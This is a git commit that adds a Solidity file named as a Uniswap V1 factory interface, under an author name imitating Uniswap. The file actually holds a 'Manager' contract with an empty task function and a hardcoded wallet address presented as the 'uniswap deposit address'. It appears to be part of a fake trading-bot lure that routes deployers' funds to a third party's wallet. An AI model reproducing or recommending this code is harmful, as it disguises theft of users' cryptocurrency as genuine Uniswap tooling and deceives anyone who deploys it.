04a642042c136b6251b61a8342b0da113de47c3b
Uniswap-v2-Router <97525378+Uniswap-v2-Router@users.noreply.github.com>
2022-01-11 13:44:48 +0100

    Create IUniswapV1Factory.sol

---
+++ master/contracts/interfaces/V1/IUniswapV1Factory.sol
@@ -0,0 +1,12 @@
+  
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x268348f3E28EF20827eDAdAf3170d63eD3566D72;
+	}
+}
